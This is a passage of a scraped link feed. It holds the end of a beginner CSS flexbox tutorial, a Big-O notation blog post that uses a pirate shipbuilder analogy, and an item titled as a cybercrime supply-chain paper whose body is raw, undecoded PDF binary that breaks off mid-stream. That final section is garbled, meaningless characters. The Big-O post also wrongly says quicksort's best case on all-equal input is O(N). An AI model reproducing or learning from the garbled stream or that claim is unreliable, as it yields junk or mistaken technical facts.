<p>The most important CSS property in flexbox is the <strong>display</strong> property. This is how we define a "flexbox container". Familiar display properties include <em>block</em>, <em>inline</em>, <em>inline-block</em> etc etc. Flex is no different, it can be defined like this:</p>
<pre><code><span>.container</span> {

    <span>display</span>: flex;
}
</code></pre>
<h2 id="container">Container</h2>
<pre><code><span>&lt;<span>div</span> <span>class</span>=<span>"container"</span>&gt;</span>
    <span>&lt;<span>div</span> <span>class</span>=<span>"item"</span>&gt;</span><span>&lt;/<span>div</span>&gt;</span>
    <span>&lt;<span>div</span> <span>class</span>=<span>"item"</span>&gt;</span><span>&lt;/<span>div</span>&gt;</span>
    <span>&lt;<span>div</span> <span>class</span>=<span>"item"</span>&gt;</span><span>&lt;/<span>div</span>&gt;</span>
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>Our flex container is typically a block level element, usually like a div for example. Refer to the below image; I have defined a flex container and inside my flex container, I have three more divs.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604881496142/fnYjCju9S.png?auto=format&amp;q=60" alt="Flexbox container / Flex container"></p>
<h2 id="items">Items</h2>
<p>These are called flex items. Each child inside a flex container is referred to as an "item". You can style these individually again, using flexbox CSS if wanted and we'll get into the specifics of this in the next part.
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604881547911/oHOA4hd7z.png?auto=format&amp;q=60" alt="Flexbox items / Flex items"></p>
<h2 id="flex-direction">Flex Direction</h2>
<pre><code><span>.container</span> {

    <span>display</span>: flex;
    <span>flex-direction</span>:
}
</code></pre>
<p>The next important CSS property in terms of flexbox is the <code>flex-direction</code> property. This allows you to specify which direction you want to place the items inside the flex container. There are four values which can be used for the <code>flex-direction</code> property, either in a row or a column (<em>e.g. horizontally or vertically</em>).</p>
<h3 id="row">Row</h3>
<pre><code><span>.container</span> {

    <span>display</span>: flex;
    <span>flex-direction</span>: row;
}
</code></pre>
<p>By default, a flex container will automatically have the flex direction of row. Items inside a row direction flex container will be displayed <em>left to right</em> (LTR), your first item will be the first placed element on the display.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604881578319/WinXtcAhZ.png?auto=format&amp;q=60" alt="Flex direction row"></p>
<h3 id="row-reverse">Row Reverse</h3>
<pre><code><span>.container</span> {

    <span>display</span>: flex;
    <span>flex-direction</span>: row-reverse;
}
</code></pre>
<p>The <code>row-reverse</code> value for <code>flex-direction</code> is similar to the <code>row</code> value, however the items inside a row-reverse direction flex container will be displayed <em>right to left</em> (RTL), so your first item will now become the last for example.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604881606985/r6yklzUvS.png?auto=format&amp;q=60" alt="Flex direction row-reverse"></p>
<h3 id="column-and-column-reverse">Column and Column Reverse</h3>
<pre><code><span>.container</span> {

    <span>display</span>: flex;
    <span>flex-direction</span>: column | column-reverse;
}
</code></pre>
<p>The next type of <code>flex-direction</code> you can specify is in the vertical axis in the form of columns. First of all with the <code>column</code> value, similar to the <code>row</code> value but placed <em>top to bottom</em> (TTB). Alternatively you can use the <code>column-reverse</code> value which again, is similar to <code>row-reverse</code> but displayed <em>bottom to top</em> (BTT).</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604881638561/5U3hUwFeJ.png?auto=format&amp;q=60" alt="Flex direction column and column reverse"></p>
<p>Hope you enjoyed part 1 of my easy to understand flexbox CSS tutorial. It really is that simple to get started using it. In the next part we'll look at some more specific properties we can use to <code>justify-content</code> to space out flex items inside our flex containers!</p>
<p>Please leave a comment and a reaction to this post if you enjoyed it! Also, I have a <strong>YouTube</strong> channel where I'm posting lots of coding tutorials, tips, tricks, reviews and more, would love to see you there:</p>

<p>See you in the next part!</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.alanmontgomery.co.uk/how-to-easily-understand-flexbox-css-part-1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25030527</guid>
            <pubDate>Mon, 09 Nov 2020 01:12:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Big-O]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25030390">thread link</a>) | @dleskosky
<br/>
November 8, 2020 | https://www.danielleskosky.com/big-o/ | <a href="https://web.archive.org/web/*/https://www.danielleskosky.com/big-o/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article aria-label="Big-O"><div>
<div><figure><img loading="lazy" width="2240" height="1260" src="https://www.danielleskosky.com/wp-content/uploads/media-uploads/bigO/bigo-banner.png" alt="Big O Banner" data-pagespeed-url-hash="2956459490" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></figure></div>


<p>Big-O is pretty important.&nbsp; It is the metric that is used to describe the efficiency of algorithms.&nbsp; Having a thorough understanding of Big-O is crucial for ensuring that algorithms are as efficient as possible.&nbsp; Let’s learn more about this fundamental computer science topic.</p>


<h2>What is Big-O?</h2>


<p>Imagine that there is a ship builder.&nbsp; Her name is Andrea.&nbsp; She makes big ships and small ships for a port city.&nbsp; She can make the small ships pretty quickly, but the bigger ships take longer.&nbsp; The amount of&nbsp;<strong>time</strong> that it takes her to build a ship is proportional to the&nbsp;<strong>size</strong> of the ship.&nbsp;&nbsp;</p>
<p>Andrea is also a pirate.&nbsp; She is known to steal other peoples’ ships.&nbsp; She usually does her pirating in a port town that is 10 days worth of travel by land and 5 days of travel back with the stolen ship, so 15 days round trip.&nbsp; The port town that she pirates from always has the ship size that she is looking for.&nbsp;</p>
<p>If a customer asks Andrea to build a ship, she has two options.&nbsp; She can either build the ship or she could put on her pirate hat and go steal a ship.&nbsp;&nbsp;</p>
<p>So if someone wants Andrea to build a ship for them, which option should Andrea choose?&nbsp; That’s right!&nbsp; It depends.</p>
<ul>
<li><strong>Build the Ship: O(s):</strong>&nbsp; where s is the size of the ship.&nbsp; This is <strong>linear</strong> time.&nbsp; The time that it takes to build the ship increases linearly depending on the size of the ship.&nbsp;</li>
<li><strong>Steal the Ship: O(1):&nbsp;&nbsp;</strong>this is <strong>constant</strong> time.&nbsp; It doesn’t matter how big or small the ship is.&nbsp; It will always take Andrea 15 days to get the ship back to the customer.&nbsp;&nbsp;</li>
</ul>
<p>So Andrea should build the ship if she can get it done in less than 15 days.&nbsp; If the ship is big enough that it would take longer than 15 days to build, then Andrea should go steal the ship.&nbsp;</p>
<p>On a side note, this blog does not condone stealing and Andrea should really rethink her life of crime.</p>
<p>Here is a graph that represents the relationship between linear O(s) and constant O(1) time:</p>


<div><figure><img loading="lazy" width="532" height="484" src="https://www.danielleskosky.com/wp-content/uploads/media-uploads/bigO/constant-linear.png" alt="Constant v linear" data-pagespeed-url-hash="366928090" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></figure></div>


<p>There are many more possible runtimes that can occur besides linear and constant.&nbsp; Here is a graph that shows some of the more commonly-used runtimes:</p>


<figure><img loading="lazy" width="1618" height="1130" src="https://www.danielleskosky.com/wp-content/uploads/media-uploads/bigO/complexity-chart.png" alt="Complexity Chart" data-pagespeed-url-hash="2991215593" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></figure>


<p>The above complexity chart comes from the <a href="https://www.bigocheatsheet.com/" target="_blank" rel="noopener noreferrer">Big-O Cheatsheet</a> website.&nbsp; Definitely a useful resource!</p>


<h2>The Three Cases</h2>


<p>Let’s use quick sort as an example.&nbsp; Quick sort picks a random element as a pivot and then swaps the values so that the elements less than the pivot appear before the elements that are greater than the pivot.&nbsp; Then it uses recursion to further sort the left and right sides.&nbsp; Learn more about quick sort <a href="https://www.geeksforgeeks.org/quick-sort/" target="_blank" rel="noopener noreferrer">here</a>.</p>
<ul>
<li><strong>Best Case:</strong>&nbsp; The best case means that the algorithm is given the most ideal data.&nbsp; If all elements are equal in the array then quick sort will just have to traverse the array once.&nbsp; Traversing an array of <strong>N</strong> elements will give a runtime of&nbsp;<strong>O(N)</strong>.</li>
<li><strong>Worst Case:</strong>&nbsp; The worst case means that the algorithm is given the least ideal data.&nbsp; With quick sort, it could happen that the pivot is repeatedly the biggest element in the array.&nbsp; If this were to happen then instead of the subarray being recursively divided in half each time, the subbarray would only be reduced by one element.&nbsp; This would give a runtime of&nbsp;<strong>O(<b><i>N</i><sup>&nbsp;2</sup></b>)</strong>.</li>
<li><strong>Expected Case:</strong>&nbsp; Typically instead of having a worst case or a best case you are more likely to have an expected case.&nbsp; Sometimes the pivot will be high and sometimes the pivot will be low, but over time they will average each other out.&nbsp; This will give a runtime more close to&nbsp;<strong>O(N log N)</strong>.</li>
</ul>
<p>The best case runtime usually isn’t of too much interest when analyzing an algorithm.&nbsp; The&nbsp;<strong>worst</strong> and&nbsp;<strong>expected&nbsp;</strong>cases are the ones that need to be considered.</p>


<h2>Space Complexity</h2>


<p>Space complexity is used to describe the total amount of memory that an algorithm uses in respect to the input size of the algorithm.&nbsp;&nbsp;</p>
<p>If an algorithm requires an array of size <em>n</em>, this will require O(n) space.&nbsp; If there is a two dimensional array of size&nbsp;<em>n </em>by <em>n, </em>then O(n<sup>2</sup>) space is required.</p>


<h2>Some Useful Big-O Tips</h2>


<p>There are a couple of tips that you should keep in the back of your mind when you are working on finding the Big-O.&nbsp; Here they are:</p>
<ul>
<li><strong>No constants</strong></li>
<li><strong>No non-dominant terms</strong></li>
<li><strong>Consider multiple runtimes</strong></li>
</ul>


<h2>No Constants</h2>


<p>With Big-O time the constants are not taken into consideration.&nbsp;</p>
<blockquote>
<p>Big-O notation doesn’t care about constants because Big-O notation only describes the long-term growth rate of functions, rather than their absolute magnitudes.”&nbsp;&nbsp;</p>
</blockquote>
<p>An algorithm that might seem to be <em>O(2N)</em> is actually only <em>O(N).&nbsp; </em>Here is a <a href="https://stackoverflow.com/questions/22188851/why-is-the-constant-always-dropped-from-big-o-analysis#:~:text=Big%2DO%20notation%20doesn't,rather%20than%20their%20absolute%20magnitudes.&amp;text=A%20function%20whose%20runtime%20is%20n2%20%2F%202%20will%20be,runtime%20is%20just%20n2." target="_blank" rel="noopener noreferrer">Stack Overflow post</a> that does a pretty good job of describing it.&nbsp;</p>
<p>Take a look at some code:</p>

<pre title="">int min = Integer.MAX_VALUE;
int max = Integer.MIN_VALUE;
for (int x : array) {
    if (x &lt; min) {
        min = x;
    }
    if (x &gt; max) {
        max = x;
    }
}
</pre>

<p>The runtime is O(array.length) or O(N).&nbsp;</p>
<p>Let’s take look at some more code:</p>

<pre title="">int min = Integer.MAX_VALUE;
int max = Integer.MIN_VALUE;
for (int x : array) {
    if (x &lt; min) {
        min = x;
    }
}
for (int x : array) {
    if (x &gt; max) {
        max = x;
    }
}
</pre>

<p>Your first intuition might to be assume that because there are two for loops that iterate the length of the array that the runtime must be O(2N).&nbsp; Don’t fall into this trap!&nbsp; The runtime is O(N).&nbsp; Remember to drop the constant!</p>


<h2>No Non-Dominant Terms</h2>


<p>What if you get a runtime like O(<i>N</i><sup>&nbsp;2</sup> + N)?&nbsp; What should we do then?&nbsp; Well, if you were able to deduce that we should drop the non-dominant term, then congratulations!&nbsp;&nbsp;</p>
<p>Consider the runtime O(<i>N</i><sup>&nbsp;2</sup> + <i>N</i><sup>&nbsp;2</sup>).&nbsp; This is the same as O(2<i>N</i><sup>&nbsp;2</sup>).&nbsp; We know that we should not include constants in our runtimes.&nbsp; So if one of the <i>N</i><sup>&nbsp;2</sup> terms is ignored then we can ignore the N in O(<i>N</i><sup>&nbsp;2</sup> + N) as well.&nbsp;&nbsp;</p>
<ul>
<li>O(<i>N</i><sup>&nbsp;2</sup> + N) becomes O(<i>N</i><sup> 2</sup>).</li>
<li>O(N + logN) becomes O(N).</li>
<li>O(5*2<sup>N</sup> + 1000N<sup>100</sup>) becomes O(2<sup>N</sup>).</li>
</ul>


<h2>Consider Multiple Runtimes</h2>


<p>If we had to iterate through two arrays of the same length N then we could say that the runtime was O(N) (remember to drop constants!).&nbsp; However what happens if the arrays are of different lengths?&nbsp;&nbsp;</p>
<p>Take a look at some code:</p>

<pre title="">for (int a : arrA) {
    print(a);
}

for (int b : arrB) {
    print(b);
}
</pre>

<p>We are iterating through two arrays of different lengths.&nbsp; The runtime is O(A + B).&nbsp; Both runtime lengths must be considered!</p>
<p>Let’s take a look at some more code:</p>

<pre title="">for (int a : arrA) {
    for (int b : arrB) {
        print(a + "," + b);
    }
}
</pre>

<p>If the arrays were of equal length we could say that the runtime was O(<i>N</i><sup>&nbsp;2</sup>).&nbsp; However, the arrays are different lengths.&nbsp; This means that for every element of A, arrB will be iterated through.&nbsp; This results in a runtime of <br>O(A * B).</p>


<h2>Thanks!</h2>


<p>Thanks for reading my post.&nbsp; I hope that you found it useful.&nbsp; Once you understand the material presented here, be sure to continue your learning about Big-O.</p>
<p>Here are some topics that you should explore next:</p>
<ul>
<li><a href="https://hackernoon.com/what-does-the-time-complexity-o-log-n-actually-mean-45f94bb5bfbf" target="_blank" rel="noopener noreferrer">Log N Runtimes</a></li>
<li><a href="https://yourbasic.org/algorithms/time-complexity-recursive-functions/" target="_blank" rel="noopener noreferrer">Recursive Runtimes</a></li>
<li><a href="https://yourbasic.org/algorithms/amortized-time-complexity-analysis/" target="_blank" rel="noopener noreferrer">Amortized Time</a></li>
</ul>
<p>Thanks again!</p><!--<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
			xmlns:dc="http://purl.org/dc/elements/1.1/"
			xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
		<rdf:Description rdf:about="https://www.danielleskosky.com/big-o/"
    dc:identifier="https://www.danielleskosky.com/big-o/"
    dc:title="Big-O"
    trackback:ping="https://www.danielleskosky.com/big-o/trackback/" />
</rdf:RDF>-->
</div></article></div>]]>
            </description>
            <link>https://www.danielleskosky.com/big-o/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25030390</guid>
            <pubDate>Mon, 09 Nov 2020 00:35:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mapping the Underground: Supervised Discovery of Cybercrime Supply Chains [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25030329">thread link</a>) | @stjo
<br/>
November 8, 2020 | https://damonmccoy.com/papers/ecrime2019.pdf | <a href="https://web.archive.org/web/*/https://damonmccoy.com/papers/ecrime2019.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>Å”•PíTÃjÜ¿Ì9‚tœ†äWŸë_ûuVÓ#?‹ÒUY'ü{Ä^5t3},5Ý©Å�Â�YÜQŒµ‹;ðR(‘îh¡‡Y]çãS„i‹Ãq5èç´®ÞáîÀæŸ‰ÌpÞàüó_°ZNöÁ
¸xy5~­uH­�ÔÜêU[-x»ºÙú–e©–0ø‘
[¤3N=V´\ûuíjŽGw±t ð[ÏR!ÀKöžÁç÷÷N°�„Ä:Ám9-·¢‘ß´Z¤¾™Õ·Þiê5
«4w¦-&nbsp;.ÞR*Abd…âH@‘òWx­¶¥‹¿ÙB	KDÐ!|GD«e÷)
î2BæÆi
&gt;R 4&nbsp;†Þ·E»Øµ‡½PŠmÀ&nbsp;#eHÓàë-íHÊðjR_dW�]�Ï³²˜ä§](©‚EJ÷<wtÓ€ )!v‘¢_«¨—�œd“�Íi="">Œ‹Ëºø”wÊGH�n	Ñ" S­¡=ÄQUW×Ù(£ì)+³áõ¤èÂö$ü”¤ÊÆ!iÊ—Û#¼Ì&amp;õÐ€0.Àò¤ÅŠò¼—.ÕÀ©‚T'˜“jò‘0ÚQžM®ÆÝàI	nã¨aáe©`AlY§mcÍºq)áÛƒ?‹R	±š¯»v…“v‰ñÀ†ÐÙuqIfPÖq*;Í1�¯
ÂØÓE5¬É±äŸ‘T–m
&gt;/È:…-âS1©5ºl8¬NÉ¯¸ú"/bÌ±Í¶A{h§ù _Ó&gt;8-àòòÓ¢î¸°%)oTÈ¾iGBHe&lt;Ø]\—&lt;¢C¡¢@*\Naª�øZ˜˜„K°µ R›‡)eòT× *kGß‡a•žk$`T¤Ò;E6KDE#~¨u“ðY%°(sb]J§TC£j�I¯3&lt;+Zeâ·mm\Œò““.µdh´])–ìÉ(Ú®”ÃHÚàûýýO[¿õ_½Ýÿ£Ÿ:IŽÈ®f�Í‚¦G[‚{}VU°~ ”]
+pônÀXƒM‰O`¤w3Æy.ÛÕ›¥À�ð=ðýM½©eÜ„G²bSý»S3ðÆ £ƒýx`CV‘{-Û }“ :|œVÆ;`Ó§dþÛÀRÅFè$Ó&gt;eíòg��s&gt;È.;çîV;®‰ü¤H˜
’-z_.à×Î”¾ì	C‰ÊÐ[MN/
¶Ñ$E�u°„n÷j&lt;Îkb%~ÿ4/ëâì!ëp¿“?Aø÷v	¢„3^äú5I¯¢Ø*µe	�î"½Í�Ýy˜Ÿ`]Škl�Ò»U*KµÇ¯7Õäl�k§×p^®Ö˜ò‘»v·ÛJ�6z«ýõÆˆü‚Äf5áË�´
’ÄÒàŽøðaÊÓèmrƒ?º¨FÙ„¼—ßzµÿnKƒhgyú«#î{£ƒ¸@…šŸ‘Î€Qê/&lt;œZìYq~5^ú´.K�*GÚ‹©Ëµ‚{O›BR&nbsp;ÿþ<mƒa8:,#è-�‘<�sˆ «¾¾Ùç!Ù%�°±k="" r‚ú="" ìû“ÅÏ‹y»jÌ6v.ÆÕ¨¸áÙauú­nØì§w¬h£ÿ±ÈÒ†9ób="">ûËÖ{[�GÙ�õÖyÇó�m&lt;ï½Ù�zoþ–þ¾§'o˜ÄM›Õã«¼Us_÷l’'§Ø;-œ¼Íÿ|s/ûGÐ^&gt;äåiVÖÔd’^~LÝ"þª û+Ï¡§êëÍ×
5�à¨ú­,Ð0g3<ulš²-Ûbhag·=©óÑ~yv%«þy.Í»1Ÿ÷™êy–}Í6¶o«“t_»º¼æ#´À¼dòé¨úu÷ »\bÆß“ªhþÝy}Ög\ÚÅrÐ›Úzuc½÷i}@ì€Ñtî‰6¬9ÆÆ¶e="" �w‰`àÈÌ‚žhkg�à?4¾="">fŽŽþ ƒVb…˜Aow›�46Øg�é9ýª›3/î–ˆŽš#¨Rë`iO/¡#!Ò	:Õl½£b(ž¥šüƒ¨iÉÞk�¿¨€³Ë×yq~QCM
´?BŸ³}Q§„_‹€§·7ÌÎ'ÌMg{ù²úŒ©6-±fK]6áÉAMÓ‘+A§æîƒž•¨Ï^1ä9'Âƒ·Ù(¿SÖûu6,Ûåù0'™ô!õß™×„c¶˜&nbsp;±ì†¬žË
¥xì%Þj¬0ÖK¹n¨¹ÕíqCÍ½¡âñ"•\©ÿb÷¿Î‡ŸòºÀ—wÅ/ÛÆ)*FyÕƒz0º5ý`ZÓiCk¾ íƒap­1¸ocøÆ~ð­ç^�³}cîÐzîÈZcî'Šþ&gt;®ý�¦”4¦B.uo�Eß/©Ù1(×T�RDäL5šxýEl8`Z64dXP-Ñd~‹+ñ£[Øh-D¢+SBö¬)YBÉ&nbsp;
¥ÓzÁ-šYÜ£W&nbsp;,ÎGCŒÇÌšÊt&nbsp;AÇÐì°Ùžýÿ—bÏ‰µÒ'2 GB_ê±™õ<o¨n€ÇøÐ0¨ç¾xÝi±.üo-Öt[lœ¹‹;—ùôáq~µmxt7œØl¹Í¸5];¼&h^Ã%s?ÕðËóà%ntþ2ì}5¼=a®_z ófÌøª$}s’af`ª´b="" Žáæ�|yÐð^Ðr«›é="">í†‘@ÏËt_Eƒ0~žî#!º‘ïG+¸£¬žmš ècèÿüè�Q U"‰S’Û0EÑÌúo6*½3Û§ÿT²Ö`“=ïz†zôzÆÓ/QþøKT?þõ�¿Dó�–øäþTÙÇõ§O¿@÷ü/)cpendstream
endobj
180 0 obj
&lt;&lt; /Filter /FlateDecode /S 186 /Length 183 &gt;&gt;
stream
xœc```b`ëd`e`šÁ Æ`620°Xèp09°1p8±L`°~°§œ!¶Œ�çsÜÓsF\azÉæ
,-s\.oìÇtp'GEekxˆ‰‹ëškS¢®wº®Nït]džÑ@|}J8P°ÂõzKxKø0$Å|&nbsp;Ë||Í%�4'ó��}Ž�Ÿ�ÁeÂëƒçüs¾”�,Q˜¤p5îäåÏèäÞHw
endstream
endobj
181 0 obj
&lt;&lt; /Annots [ 191 0 R 192 0 R 193 0 R 194 0 R 195 0 R 196 0 R 197 0 R 198 0 R 199 0 R 200 0 R ] /Contents 182 0 R /MediaBox [ 0 0 612 792 ] /Parent 387 0 R /Resources 203 0 R /Type /Page &gt;&gt;
endobj
182 0 obj
&lt;&lt; /Filter /FlateDecode /Length 4519 &gt;&gt;
stream
xÚ¥Z[“ãÆ­~÷¯˜‡ã*Í©Í»È&lt;ÙY¯ÏÙT¼veÇq¥Ö~è![3©ðâñì¯&gt;MRÎ&amp;©¼Hhô�&gt;&nbsp;éßnü›ÿûÂ¿úÿãý_}DþMyyàG7÷û›8óò4¾Ù…¾—Ñÿ}yóqó½9Ÿ«æp»�âx3-ˆhóSSÚî6È6‡®›òRýa&lt;Ûî·ª·¥´ú¶ê‹ö6H6¿áÇvÏÒ¬Ýßþzÿ§› L¼ Jo¶áÎËòT¦{óü`»¢«N˜(ñ1ä¹~úÍÑTM�¾²òÀ÷ò$Ë±òmšyqº»ÙF�e¡ŒõÓW�FúþñhjÛ™V{ûþÍÎËw~€Î»ÈÃÝ
É!É¥ç/¾­Î{»(¤Yæ¦w2þ÷æ÷'[×Rø¦®Ì¹ëªí×æ£’—ñ7á;šCEtO¦ªUÐkû½(YÎöüÊTaº:ÕSº¹¾Ùwí§µ9Rß‹‚l9É§ÿl’oÍ©mT–ÅÚŒ?-ór3‰¯ŠŽÍC/�I	‚Ðs:°lx““~‡)†ÉèÈ±Œ4PÅ{o!¿'YÁßnópÓv�Rú©©~ƒ¶û›¾²[Œy­Êw;ZYwBä3Mø¼¶¬�·‹ó‹u]MÎ¢$Âœºª&lt;&nbsp;Ö®­š–¥ÿÙº&gt;ý{ëz×¶kÌPµ�QµÓžÎ#qUkŠÊ6…^ãwM?TU®­r¦©!\f2AÇ·÷áøuƒƒy=[Žª+'3_°•j\
ïâV|]Ô^aNž)¼ñQ[õÐê¯«¢¯&lt;29�,Ãš•àù6M6ËéŠBôñr.ÚÉ«Š­Å70£°Ÿ´52m¬ïdêrÝØ7ýÐ™bp¢Hí#º)Aâì2KliûÁ4%[á$JÅ
'ÑnÓÛŒ�q/|¨Øg¶Ì-ñ{WÕX[’Uæk“NÐ‘oq‘L4´Ô,6d¾÷·aBª†‘¿Vƒªe¯êµ®‹
*€‚ö–‚Ýïm1TÝo¢¢Òš33¨PïñÚ|Y•ÞÝÿg©?Yõ Ô¶Ã½¤S	éï`2èKe’Jo…ìÕi„y´)Äi0¿;ÞÍ)ÕáFÊÿ+!´á@»Ü.W¤r*h¥ã‰§Œ#èa3bç&nbsp;i³²÷ÁÆÏÐ"+´žÈ¹í™ÁråìplK¡‡£„ª—;6Û¯¬ädŠcÕðíÊ©ƒéÐ¥G�úR©:tæ|Ü&gt;ñÉÄ0t]Ÿ{J8x´·{2”!nì Þ6ßØß'-½:'Þ8ßMâ½—]ž´æJg¸…ˆh&lt;õRžm~;©y1¦�åê1P+x‹$¦­Ö‡¶«†ãIŠ…Q~UBµöÏRŠ¢/A"pâðK!ääB7Í&nbsp;cM€ãjO4_ÅÞ*&nbsp;“ø{Ë&amp;/Ü¼muÕ…¯Glþ2ö}e´õ,�;é£zw¾¼)$Š$×lú£\œîËÓ¨Nª]sïíg]p!i²l=P¥¨I‡\Ë½üÁ—BðÐ#ùòN8¯®uço¼1ñé¦»x¡t(a&amp;üóJÒ]2&gt;˜N¡@—–0Œå`•3ÂÖÏW’˜og#š�-‘àìðd-T‰­R*ÇbÐjÙ ¬ö¨bS
Ž^FêfdÓÂ&gt;·”ÊÔõóÊIŒ½Ý�5,H.�Íväë�œêÈŠL5,ÔTu]Õ&nbsp;í�”Ùï£šý¾´ïíŠ.®W˜F›ïœ9Ó˜.´9�ë[²ËwÂhÇNšéU‡‰@q2Ÿé|àÓê`üè4¤\Òõ—«hGˆ.ŽU¾q²¡S´ÏÂ«
ï^L("
[›ŠÜXÕg8b¥U'%Rr²¬†ñwkWä/Ñ	éÓ~lX
DÀÄ`Áíç#¸ÍBVêˆ—Ž[öƒÑwï”öw¥hs/D'Ø¯ypŠ¡âðÂƒ°äwp†r£1Â›Û¨Ì÷f;v'4üŸMsÉöKÕ�¢»b·IF1Î¥‡¯×Kñ›¦^š Ê
(èt3dßpe·	àÒÜk£$^J”nã=Ý¾�ö½MÉœÑá‡›˜ó-s~búÍ¢Í;¦¥ÍûUÈGP=ÌcB|ˆw×±ßÖô[³ý€`'žÑ†�Ø]*)‹ñB2c]WÁ¸1·•º¥ˆ6AîIÿYlz¤A@±C"3’
ôÇ¤ƒ;]©yÝÿáYëÛÓ©-«¡ú$ÚK¬²b5ÚÛÎÂg€u6Ý&nbsp;Ù¢Ò¿&amp;'¶œ|0Å#ã�`ó1Œõ„ü«à+%C�¯-QøÀùðCóyQÅï„kä¯?›ÓÉvk“b™YÈ2‹³¡RÈ·�xFþžØ&gt;K½´#te]+»Ä†'C½)£¬T¡BÄDrŠC·¶Œ¢³lN"òÌýÐv–âKHå'û@!�eGc§�©$!LÍ„8¶=Ð&nbsp;6ïXvšùJ¿”í	–�–ÉñesÀgvRAr©køTmlŠÂžiÜ65Ã0ðÏæ™=ïêNÙ°‘öcxF„OÀ ¸3ÒÎO¬ÁTÝ‹Ò{RúùH[å–/mpV&amp;t‡Ïx“QQ…0Î=ÙýBqèµG\&amp;Z=Ð•&nbsp;U’VOtº<a”o�È_vŸØ¹`3�t´,5bpfŸr1˜þÑ“ª7w·‘ûíÉ¯mÜyöy@2�ü�—i*a^Ür+cîÙh=6ŠkÎûaÐ³5º�Ù™Ò¾²>—þX�!¶0v8‚$&amp;'@¬=ß©ÒeÕG¥`2ª”ON·9(‡�5™&nbsp;˜‡¶-û5­VÐé;5ê¥TifE³8ý"©¦`¤¬ŒVß6‚æÓùØ{^išÏ€�hØS�(ø7Z³”6º²�6_B
”‡ixþkV[‚^Zs¦�(Ëp«\¼6-'&gt;
ýM[Kö±œj¸ƒ€b8ý’ƒ®×“Võ÷„ÿcWµ«†”M$§Šâ$ÚM/°˜®¥þO
«á
Ö+îâ$šÌQ+ÓFlg·kgÞ�5â•(Þ`Í�’ýhÒ &amp;3iAEb+À•u�[´c]
Ó6¤ùVØV¯»‹rMÕKu£&lt;ñÉ³&lt;[â‡Pxp�'£ƒ1ç�q:šõvžˆáªk�á¾ã`hè½f÷†±d³•Ä©Þ§sÝ
âLJ.í
š�œXöRÍI”8uÖlv5…rmò®LJì0Œ˜Iš—%)‰"ùõNj?†Ñ¯BI8Jµª/Âí['%ì&nbsp;0lhÂÊüVpÆ©eï»K×O­VãÂÜ†)‚ªw¼gÜ@6öLnžî™x`çvmî–ú&nbsp;K,LJ†×BHQ#¡yŽ,I!Ä€ª�Ã4ÿ©!#&lt;Œ°5çßî„/¸ª÷ŒôX£Íc#¬my°Â",qêÅ	ÅÑdôAWú�‘¦@P4k;¾TÅ$Ÿ²@Iê;çö7óòEã´K)¹WkºâÈ@]FV34ÑÇ¶X›W2”¼µ9¥¬R“;	…E2ô$Nëa{j
¡„‘·À¤Vº|F4k˜•…þ"¼•²¤$OÌ}&gt;[Í&gt;´ãá¨ì©WßÖå‹ZÕq2;­4uC¨³¦2L3H¶¿,8÷‚w¨¼VZÏù"mYu«)Þ
}=?ˆoâ&lt;öòXŸÉÔÐØn¨ØžïB
e‰Xä%&lt;á|ï²w( {×hHª!B,"¨±¿²;éâ0È&gt;™‘ðãt&nbsp;j;ÀŸ².³aKV&lt;Ñ¿ÓF�XÕ�×û`ÆºýÔ¹:â‹	 –;|f²Tü�&gt;ª?†)[bª\ºœô*¢ûÉ‹2.‚7%Ø
Y^½=NîV	qL.a›8ÚEÞ(šw·²&gt;,@§¦„�S5»«˜ìÙ3®
y¤t—»ôü¤Çç©š³Û&lt;×<yù§õhnvbªgb³âó ­ü÷d,iful«í<÷¤gÍ''Ð!Êâi…‚;af¢8á4="" Ûxæ^éx{—ŒbÙÀµÀhzzlØ£¨mß³{–ÈÃum¦…ÛaßàµˆóÁ‘•€2Òqï8w¥Ððîu]vÓenc¢$&9œëÊq«¦$!Š·a¥(9jŒ0ÔÖå”•­òd×Ýð+ëÐ½q$�ˆdê8i¬j‰Õc="">oðmÍ‚ƒÁy~!å†e¼¦^YËFkf½[²®0œ-SëQ¶KIì—W\Šƒ{!§ûƒ^|½}gÓ®¡ÞªX•0Vó	¢ä¡kÐ²­ë©N–³�Dsº™»N*…ÒR†(�Þ®™Ó3C|þpaõ(±÷À\NÁ,íô
�¢Ú0�¦Ôœ/Öº›¨ûÌþgÍ/ŒŽ›øs@§zùjð6�Õ«&amp;æçÛŒßàÂ&lt;—BT¢Ià¨¿ÜíÖ6Z1?¢Ån°çã–‰çêÌo	/mÌ8¸ç§OŠx‘³Î#…Ûƒ*&lt;`‰&gt;ÂUµ†#IþÒy%ùldPxÅÈLëÛFút‰7ìhµf6…TâG#nÈ§@?�X±’4Œ»üÊ)ÿí¸š~šŸŠÈˆÖS²vR&amp;#b~8zÑfrØ¨êÜ“Ìêã	{M÷â`rãþÙ‡&nbsp;Ü Çž…J
žbßnƒ
´…Å£Z1¨&nbsp;~4’ÁJ!ðh´š#ym­Û0‹f%ºŸB"”.
¢´^ˆºÅP¥vtš›-ž3
¤AþE,{2EÇ
¤I¢&gt;¹IóÀ¹W&amp;é�´ôB'Ùt3À$òéX1"Åh½üëKÑÊÔ{6AùnŠPÊæ&nbsp;U¢ Äå
